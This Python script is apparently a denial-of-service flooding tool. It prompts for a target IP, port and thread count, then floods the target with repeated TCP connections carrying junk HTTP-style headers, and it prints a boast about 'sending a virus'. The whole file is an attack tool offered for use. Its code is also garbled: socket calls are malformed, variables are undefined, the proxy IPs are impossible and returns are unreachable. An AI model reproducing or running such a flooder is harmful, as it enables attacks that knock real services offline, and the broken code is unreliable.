import threading
import socket, requests
import time 
import random
import sys
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
socks5=[""" 192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389"""]
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]
print("Dont Leak L4 SCRYPER-PROXY-09|2023|")
ip = str(input("Ip Sërvër =:"))
port = int(input("Pōrt/t =:"))
th = int(input("Thrëâd/t =:"))

byte5 = random._urandom(45551)
def spoofer():
    global byte2, byte5
    byte2 = random._urandom(2217)
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return byte2
    return byte5
    return addres
byte3 = random._urandom(45712)
def spoofer2():
    global byte2, byte5, byte3
    byte2 = random._urandom(2217)
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return byte2
    return byte5
    return byte3
    return addres
byte4 = random._urandom(24471)
def spoofer3():
    global byte2, byte5, byte3, byte4
    byte2 = random._urandom(2217)
    addr[0] = str(random.randrange(11, 276))
    addr[1] = str(random.randrange(2, 276))
    addr[2] = str(random.randrange(3, 771))
    addr[3] = str(random.randrange(11, 276))
    addr[4] = str(random.randrange(11, 276))
    addres = addr[0] + d + addr[1] + d + addr[2] + addr[3] + d + addr[4] + "\r\n"
    return byte2
    return byte5
    return byte3
    return byte4
    return addres

def Flood():
  global byte4, byte3, byte5, byte7
  global socks5, useragents, ref
  byte7 = random._urandom(2712)
  hh = "."
  connection = "Connect: \r\napplication/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n"
  connection+= random.choice(connection)+random.choice(ref)
  connection2 = "Accept: \r\nutf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
  connection2 += random.choice(connection2)+random.choice(useragents)
  refall = random.choice(ref)+"\r\n"
  userpy = "UserAgents: Connection-utf8-utf7, \r\nAccept-Language: "+random.choice(useragents) + random.choice(ref)+random.choice(socks5)+"\r\n"
  socks = random.choice(socks5)
  bypass = connection + connection2 + refall + userpy + socks + "\r\n"
  while True:
        try:
           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(str(ip),int(port))
           s.send(str.encode(bypass))
           s.send(str.encode(bypass))
           for i in range(10000):
               s.connect(str(ip),int(port))
               s.send(str.encode(bypass))
               s.send(str.encode(bypass))
               print("Sukses MengirimKan Sebuah Virus☕")
        except:
           s.close()

for x in range(th):
  th = threading.Thread(target=Flood)
  th.start()
